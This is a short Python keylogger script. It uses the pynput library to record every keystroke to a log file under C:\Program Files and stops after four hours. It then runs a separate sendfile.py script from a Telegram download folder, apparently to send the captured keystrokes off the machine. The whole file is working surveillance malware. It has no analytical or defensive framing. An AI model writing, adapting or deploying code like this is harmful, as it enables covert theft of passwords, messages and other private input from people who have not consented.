import os
import logging
import subprocess
import threading
import time
from pynput import keyboard

# Path
log_dir = "C:\\Program Files\\"
log_file = os.path.join(log_dir, "logs.txt")

# Keylogger run and save
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(str(key.char))
    except AttributeError:
        logging.info(str(key))
        if key == keyboard.Key.esc:
            # Stop listener
            return False

def stop_listener(listener):
    time.sleep(4 * 3600)  # Sleep for 4 hours (4 hours * 3600 seconds/hour)
    listener.stop()

def run_keylogger():
    # Start listener
    with keyboard.Listener(on_press=on_press) as listener:
        # Start a thread to stop the listener after 4 hours
        stop_thread = threading.Thread(target=stop_listener, args=(listener,))
        stop_thread.start()
        listener.join()

    # Run sendfile.py after listener stopped
    subprocess.run(["python", "C:\\Users\\Admin\\Downloads\\Telegram Desktop\\sendfile.py"])

if __name__ == "__main__":
    run_keylogger()
